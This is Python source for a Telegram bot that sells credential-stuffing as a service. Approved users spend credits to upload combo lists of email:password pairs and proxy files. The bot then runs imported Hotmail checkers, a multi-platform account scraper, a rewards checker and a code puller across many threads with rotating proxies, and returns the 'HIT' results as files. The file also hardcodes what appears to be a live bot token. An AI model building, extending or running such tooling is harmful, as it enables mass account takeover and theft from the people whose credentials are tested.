import os
import logging
import threading
import asyncio
import time
import shutil
import glob
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler
from telegram.constants import ParseMode

# Import tools
import flux
import h
import hit
import p7
import pullerv2
import database

# Authorized Admin ID
ADMIN_ID = 5944410248
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

UPLOADS_DIR = "uploads"
os.makedirs(UPLOADS_DIR, exist_ok=True)

# --- UI Helpers ---

def get_footer():
    return f"\n\n✨ _Credits to Admin_ [`{ADMIN_ID}`]"

def get_header(title):
    return f"🛡 **{title}**\n━━━━━━━━━━━━━━━━━━━━\n"

def restricted(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if not update.effective_user: return
        user_id = update.effective_user.id
        if database.is_banned(user_id):
            await update.message.reply_text("🚫 **You are BANNED.**")
            return
        if not database.is_approved(user_id):
            await update.message.reply_text(
                f"🚫 **Access Denied**\n\nContact Admin [`{ADMIN_ID}`] for access.\nID: `{user_id}`{get_footer()}",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

def admin_only(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if not update.effective_user: return
        if not database.is_admin(update.effective_user.id):
            await update.message.reply_text(f"❌ **Admin Only**{get_footer()}", parse_mode=ParseMode.MARKDOWN)
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

# --- Command Handlers ---

@restricted
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = database.get_credits(user_id)
    settings = database.get_user_settings(user_id)
    plan = database.get_plan(user_id)

    keyboard = [
        [InlineKeyboardButton("🎮 Flux Scraper", callback_data='tool_flux'),
         InlineKeyboardButton("📧 Hotmail (H)", callback_data='tool_h')],
        [InlineKeyboardButton("🔥 Adv. Hotmail (HIT)", callback_data='tool_hit'),
         InlineKeyboardButton("💰 Rewards (P7)", callback_data='tool_p7')],
        [InlineKeyboardButton("🗝 Code Puller (V2)", callback_data='tool_pullerv2')],
        [InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
         InlineKeyboardButton("👤 Profile", callback_data='profile')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    msg = (
        f"{get_header('TOOLBOT DASHBOARD')}"
        f"🏅 **Plan:** `{plan}`\n"
        f"💳 **Credits:** `{credits}`\n"
        f"🧵 **Threads:** `{settings['threads']}`\n"
        f"🌐 **Proxy File:** `{'SET ✅' if settings['proxy_file'] else 'NOT SET ❌'}`\n\n"
        f"Select a tool to begin:{get_footer()}"
    )
    await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

@restricted
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        f"{get_header('HELP & COMMANDS')}"
        f"/start - Dashboard\n"
        f"/me - Profile & Settings\n"
        f"/threads <num> - Set threads (max 50)\n"
        f"/help - Show this message\n\n"
        f"**Thread Limits:**\n"
        f"• Max **5 threads** without proxy file.\n"
        f"• Max **50 threads** with proxy file.\n\n"
        f"**File Types:**\n"
        f"After uploading a .txt file, select if it's a **Combo** or **Proxy** file."
    )
    if database.is_admin(update.effective_user.id):
        help_text += "\n\n**Admin:** /approve /revoke /ban /unban /setplan /add_credits /users"
    await update.message.reply_text(help_text + get_footer(), parse_mode=ParseMode.MARKDOWN)

@restricted
async def me_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    msg = (
        f"{get_header('USER PROFILE')}"
        f"🆔 **ID:** `{u.id}`\n"
        f"🏅 **Plan:** `{database.get_plan(u.id)}`\n"
        f"💳 **Credits:** `{database.get_credits(u.id)}`\n"
        f"🧵 **Threads:** `{database.get_user_settings(u.id)['threads']}`\n"
        f"🌐 **Proxy File:** `{'SET ✅' if database.get_user_settings(u.id)['proxy_file'] else 'NOT SET ❌'}`{get_footer()}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

@restricted
async def threads_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args:
        await update.message.reply_text(f"🧵 **Threads:** `{database.get_user_settings(uid)['threads']}`")
        return
    try:
        n = int(context.args[0])
        if n < 1: raise ValueError
        if not database.get_user_settings(uid)['proxy_file'] and n > 5 and not database.is_admin(uid):
            await update.message.reply_text("❌ Max 5 threads without proxy file.")
            return
        if n > 50 and not database.is_admin(uid): n = 50
        database.update_user_settings(uid, threads=n)
        await update.message.reply_text(f"✅ Threads set to `{n}`.")
    except: await update.message.reply_text("❌ Invalid number.")

# --- Admin ---

@admin_only
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.set_approved(int(context.args[0]), True); await update.message.reply_text("✅ Approved.")
    except: await update.message.reply_text("Usage: /approve <id>")

@admin_only
async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.set_approved(int(context.args[0]), False); await update.message.reply_text("✅ Revoked.")
    except: await update.message.reply_text("Usage: /revoke <id>")

@admin_only
async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.ban_user(int(context.args[0])); await update.message.reply_text("✅ Banned.")
    except: await update.message.reply_text("Usage: /ban <id>")

@admin_only
async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.unban_user(int(context.args[0])); await update.message.reply_text("✅ Unbanned.")
    except: await update.message.reply_text("Usage: /unban <id>")

@admin_only
async def setplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.set_plan(int(context.args[0]), context.args[1]); await update.message.reply_text("✅ Plan set.")
    except: await update.message.reply_text("Usage: /setplan <id> <plan>")

@admin_only
async def add_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.add_credits(int(context.args[0]), int(context.args[1])); await update.message.reply_text("✅ Credits added.")
    except: await update.message.reply_text("Usage: /add_credits <id> <amount>")

@admin_only
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    all = database.get_all_users()
    rep = f"{get_header('USERS')}"
    for k, v in all.items():
        rep += f"• `{k}` | {'✅' if v.get('approved') else '❌'}{' 🚫' if v.get('banned') else ''} | `{v.get('plan')}` | `{v.get('credits')}` cr\n"
    await update.message.reply_text(rep, parse_mode=ParseMode.MARKDOWN)

# --- Handlers ---

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q: return
    await q.answer()
    uid = q.from_user.id
    if database.is_banned(uid) or not database.is_approved(uid): return

    if q.data.startswith('tool_'):
        tool = q.data.split('_')[1]
        context.user_data['selected_tool'] = tool
        await q.edit_message_text(f"{get_header(f'TOOL: {tool.upper()}')}Upload your **.txt combo file** now.{get_footer()}", parse_mode=ParseMode.MARKDOWN)
    elif q.data == 'settings':
        s = database.get_user_settings(uid)
        await q.edit_message_text(f"{get_header('SETTINGS')}🧵 Threads: `{s['threads']}`\n🌐 Proxy File: `{'SET' if s['proxy_file'] else 'NOT SET'}`\n\nUse `/threads <n>` to change threads.\nUpload a file and select 'Proxy File' to set proxies.{get_footer()}", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]]))
    elif q.data == 'profile':
        msg = f"{get_header('PROFILE')}🆔 ID: `{uid}`\n🏅 Plan: `{database.get_plan(uid)}`\n💳 Credits: `{database.get_credits(uid)}`{get_footer()}"
        await q.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]]))
    elif q.data == 'back_to_start':
        s = database.get_user_settings(uid)
        kb = [[InlineKeyboardButton("🎮 Flux Scraper", callback_data='tool_flux'), InlineKeyboardButton("📧 Hotmail (H)", callback_data='tool_h')], [InlineKeyboardButton("🔥 Adv. Hotmail (HIT)", callback_data='tool_hit'), InlineKeyboardButton("💰 Rewards (P7)", callback_data='tool_p7')], [InlineKeyboardButton("🗝 Code Puller (V2)", callback_data='tool_pullerv2')], [InlineKeyboardButton("⚙️ Settings", callback_data='settings'), InlineKeyboardButton("👤 Profile", callback_data='profile')]]
        await q.edit_message_text(f"{get_header('DASHBOARD')}💳 Credits: `{database.get_credits(uid)}`\n🧵 Threads: `{s['threads']}`{get_footer()}", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
    elif q.data.startswith('file_'):
        ftype = q.data.split('_')[1]
        fpath = context.user_data.get('last_uploaded_file')
        if ftype == 'proxy':
            database.update_user_settings(uid, proxy_file=fpath)
            await q.edit_message_text(f"✅ **Proxy file saved.** Threads up to 50 allowed.{get_footer()}", parse_mode=ParseMode.MARKDOWN)
        elif ftype == 'combo':
            tool = context.user_data.get('selected_tool')
            if not tool: await q.edit_message_text("❌ Select tool first."); return
            if database.get_credits(uid) <= 0: await q.edit_message_text("❌ No credits."); return
            database.deduct_credit(uid)
            s = database.get_user_settings(uid)
            st_msg = await q.edit_message_text(f"🚀 **Starting `{tool.upper()}`...**\nThreads: `{s['threads']}`\nProxy: `{'Using file ✅' if s['proxy_file'] else 'None ❌'}`\n⏳ _Loading..._", parse_mode=ParseMode.MARKDOWN)
            threading.Thread(target=run_tool_async, args=(tool, fpath, q.message.chat_id, st_msg.message_id, context.application, s), daemon=True).start()

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if database.is_banned(uid) or not database.is_approved(uid): return
    doc = update.message.document
    if not doc or not doc.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Upload a `.txt` file.")
        return
    f = await context.bot.get_file(doc.file_id)
    path = os.path.join(UPLOADS_DIR, f"{uid}_{int(time.time())}_{doc.file_name}")
    await f.download_to_drive(path)
    context.user_data['last_uploaded_file'] = path
    kb = [[InlineKeyboardButton("📄 Combo File", callback_data='file_combo'), InlineKeyboardButton("🌐 Proxy File", callback_data='file_proxy')]]
    await update.message.reply_text(f"📂 **File Received:** `{doc.file_name}`\nWhat is this for?", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

# --- Engine ---

def run_tool_async(tool, fpath, cid, mid, app, settings):
    last_up = [0]
    ival = 5
    th = settings['threads']
    pf = settings['proxy_file']
    plist = []
    if pf and os.path.exists(pf):
        with open(pf, 'r') as f: plist = [l.strip() for l in f if l.strip()]

    def callback(text):
        if time.time() - last_up[0] < ival and "Finished" not in text and "Completed" not in text: return
        last_up[0] = time.time()
        asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(chat_id=cid, message_id=mid, text=f"⚙️ **PROGRESS: {tool.upper()}**\n━━━━━━━━━━━━━\n{text}{get_footer()}", parse_mode=ParseMode.MARKDOWN), app.loop)

    try:
        res_path = None
        if tool == 'flux':
            if plist:
                 with open("proxies.txt", "w") as f:
                      for p in plist: f.write(p + "\n")
            p = flux.ComboParser(fpath); accs = p.parse()
            if not accs: callback("❌ No accounts."); return
            s = flux.Settings(); s.set('max_threads', th)
            scr = flux.MultiPlatformScraper(accs, s, "All", log_callback=callback)
            scr.check_all(); res_path = scr.results_folder
        elif tool == 'h':
            chk = h.HotmailChecker(log_callback=callback, proxies=plist)
            chk.run(fpath, num_threads=th); res_path = "Hotmail-Hits.txt"
        elif tool == 'hit':
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f: lines = [l.strip() for l in f if ':' in l]
            if not lines: callback("❌ No accounts."); return
            stats = hit.LiveStats(len(lines), callback=callback)
            mgr = hit.EnhancedResultManager(f"bot_{int(time.time())}", "full")
            def prc(line):
                try:
                    e, p = line.split(':', 1); c = hit.UnifiedChecker(check_mode="full_enhanced")
                    if plist: pr = random.choice(plist); c.session.proxies = {'http': pr, 'https': pr}
                    r = c.check(e.strip(), p.strip()); stats.update(r["status"], r if r["status"] == "HIT" else None)
                    if r["status"] == "HIT": mgr.save_hit(e, p, r)
                    stats.print_live("full_enhanced")
                except: pass
            from concurrent.futures import ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=th) as ex: ex.map(prc, lines)
            res_path = mgr.base_folder
        elif tool == 'p7':
            p7.check_bulk(fpath, threads=th, proxy=random.choice(plist) if plist else None, callback=callback)
            res_path = "Results"
        elif tool == 'pullerv2':
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                 accs = [l.strip().split(':', 1) for l in f if ':' in l]
            if not accs: callback("❌ No accounts."); return
            if plist:
                 with open("proxies.txt", "w") as f:
                      for p in plist: f.write(p + "\n")
            pullerv2.MAX_THREADS_FETCHER = th; pullerv2.MAX_THREADS_VALIDATOR = th
            pullerv2.phase1_fetch_codes(accs, callback=callback)
            pullerv2.phase2_validate_codes(accs, codes=None, callback=callback)
            fs = glob.glob("validation_results_*")
            if fs: res_path = max(fs, key=os.path.getmtime)

        asyncio.run_coroutine_threadsafe(app.bot.send_message(chat_id=cid, text=f"✅ **Tool `{tool.upper()}` finished!**"), app.loop)
        if res_path and os.path.exists(res_path):
            final = res_path
            if os.path.isdir(res_path):
                shutil.make_archive(res_path, 'zip', res_path); final = f"{res_path}.zip"
            asyncio.run_coroutine_threadsafe(app.bot.send_document(chat_id=cid, document=open(final, 'rb'), caption=f"📦 **Results: {tool.upper()}**{get_footer()}", parse_mode=ParseMode.MARKDOWN), app.loop)
        else: callback("✅ Done, no results file.")
    except Exception as e:
        logger.error(f"Error {tool}: {e}")
        asyncio.run_coroutine_threadsafe(app.bot.send_message(chat_id=cid, text=f"❌ **Error:** `{e}`"), app.loop)

if __name__ == '__main__':
    if not database.is_approved(ADMIN_ID): database.set_approved(ADMIN_ID, True)
    if not BOT_TOKEN or ":" not in BOT_TOKEN: exit(1)
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('help', help_command))
    app.add_handler(CommandHandler('me', me_command))
    app.add_handler(CommandHandler('threads', threads_command))
    app.add_handler(CommandHandler('approve', approve))
    app.add_handler(CommandHandler('revoke', revoke))
    app.add_handler(CommandHandler('ban', ban))
    app.add_handler(CommandHandler('unban', unban))
    app.add_handler(CommandHandler('setplan', setplan))
    app.add_handler(CommandHandler('add_credits', add_credits))
    app.add_handler(CommandHandler('users', users))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
    app.run_polling()
